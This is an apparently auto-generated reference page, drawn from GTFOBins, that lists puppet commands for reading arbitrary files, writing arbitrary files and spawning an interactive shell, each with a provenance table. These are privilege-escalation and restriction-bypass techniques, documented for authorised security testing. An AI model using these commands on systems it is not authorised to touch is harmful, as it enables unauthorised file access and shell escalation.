---
parsed_by: focuslocust
source: commands
type: generated
---
# puppet Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## puppet

Tool page: [puppet](../../tools/linux/puppet.md)

### file-read

```text
puppet filebucket -l diff /dev/null /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/puppet` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
puppet apply -e 'file { "/path/to/output-file": content => "DATA" }'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/puppet` |
| Evidence | Function example preserved from source parser. |

### shell

```text
puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/puppet` |
| Evidence | Function example preserved from source parser. |
